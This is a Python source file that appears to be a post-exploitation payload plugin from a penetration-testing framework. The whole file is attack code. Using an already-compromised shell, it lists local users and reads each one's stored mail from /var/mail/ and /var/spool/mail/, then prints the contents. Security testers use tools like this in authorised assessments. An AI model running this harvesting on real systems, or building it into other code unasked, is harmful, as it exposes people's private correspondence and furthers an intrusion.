import re
from plugins.attack.payloads.base_payload import base_payload

class read_mail(base_payload):
    '''
    This payload shows local mails stored on /var/mail/
    '''
    def api_read(self):
        result = {}
        directory = []

        directory.append('/var/mail/')
        directory.append('/var/spool/mail/')

        users = self.exec_payload('users').keys()
        for direct in directory:
            for user in users:
                content = self.shell.read(direct+user)
                if content:
                    result.update({direct+user:content})

        return result
        
    def run_read(self):
        hashmap = self.api_read()
        result = []
        if hashmap:
            result.append('Stored Mail')
            for file, content in hashmap.iteritems():
                result.append('-------------------------')
                result.append(file)
                result.append('-------------------------')
                result.append(content)
        if result == [ ]:
            result.append('No stored mail found.')
        return result
